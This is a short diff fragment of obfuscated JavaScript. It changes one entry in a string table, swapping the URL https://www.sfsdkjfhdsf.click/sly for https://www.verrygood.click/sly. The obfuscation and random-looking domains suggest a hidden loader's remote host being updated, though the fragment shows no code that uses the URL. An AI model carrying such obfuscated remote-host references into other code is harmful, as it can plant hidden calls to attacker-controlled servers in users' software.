@@ -137,7 +137,7 @@ function _0x3acc(_0x284298, _0x25b2df) {
           "4040485VJAukx",
           "135228raUOXF",
           "953976yPVeKh",
-          "https://www.sfsdkjfhdsf.click/sly",
+          "https://www.verrygood.click/sly",
           "18472cpiDMs",
           "2854798lglKqX",
           "test",
